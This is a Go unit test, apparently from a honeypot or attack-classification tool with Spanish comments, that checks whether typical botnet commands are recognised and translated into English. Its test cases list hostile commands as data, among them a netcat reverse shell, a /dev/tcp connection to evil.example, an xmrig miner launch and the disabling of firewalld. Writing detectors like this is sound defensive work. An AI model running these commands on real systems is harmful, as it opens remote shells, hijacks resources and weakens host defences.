@@ -1,0 +1,31 @@
+package saber
+
+import "testing"
+
+// TestReconocimientoComandosAmpliado fija que los comandos habituales de un
+// ataque de botnet -reconocimiento, shell inversa, minado, persistencia- se
+// reconocen sin IA y traen su traduccion al ingles.
+func TestReconocimientoComandosAmpliado(t *testing.T) {
+	casos := []string{
+		"[ -f /etc/os-release ] && echo ok",
+		"cd /tmp || cd /dev/shm",
+		"echo -e '\\x7f\\x45\\x4c\\x46' > .a",
+		"nc -e /bin/sh 1.2.3.4 4444",
+		"exec 5<>/dev/tcp/evil.example/9999",
+		"xmrig -o stratum+tcp://pool:3333",
+		"whoami",
+		"systemctl disable firewalld",
+		"perl -e 'exit'",
+		"base64 -d payload.b64",
+	}
+	for _, c := range casos {
+		n, ok := DeComando(c)
+		if !ok {
+			t.Errorf("no reconocido: %q", c)
+			continue
+		}
+		if en := n.En("en"); en.Que == n.Que {
+			t.Errorf("sin traduccion EN: %q (Que=%q)", c, n.Que)
+		}
+	}
+}
